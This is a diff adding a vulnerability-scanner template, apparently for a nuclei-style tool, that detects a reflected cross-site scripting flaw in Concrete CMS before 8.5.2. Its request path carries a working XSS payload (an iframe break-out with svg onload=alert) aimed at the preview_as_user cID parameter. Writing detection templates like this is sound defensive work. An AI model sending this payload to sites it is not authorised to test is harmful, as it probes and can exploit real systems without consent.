@@ -1,0 +1,38 @@
+id: "concrete-xss"
+name: "Concrete CMS <8.5.2 - Cross-Site Scripting"
+severity: "high"
+description: "Concrete CMS before 8.5.2 contains a cross-site scripting vulnerability in preview_as_user function using cID parameter."
+tech:
+  - "generic"
+tags:
+  - "hackerone"
+  - "concrete"
+  - "xss"
+  - "cms"
+  - "unauth"
+  - "intrusive"
+  - "vuln"
+cwe: "CWE-79"
+reference: "https://hackerone.com/reports/643442"
+spaExclusion: true
+request:
+  method: "GET"
+  path: "/ccm/system/panels/page/preview_as_user/preview?cID=\"></iframe><svg/onload=alert(\"{{rand}}\")>"
+control:
+  method: "GET"
+  path: "/.guardian-none-{{rand}}"
+matchers-condition: "and"
+matchers:
+  - type: "word"
+    part: "body"
+    words:
+      - "</iframe><svg/onload=alert(\"{{randstr}}\")>"
+  - type: "word"
+    part: "header"
+    words:
+      - "text/html"
+      - "CONCRETE5"
+    condition: "and"
+  - type: "status"
+    status:
+      - 200
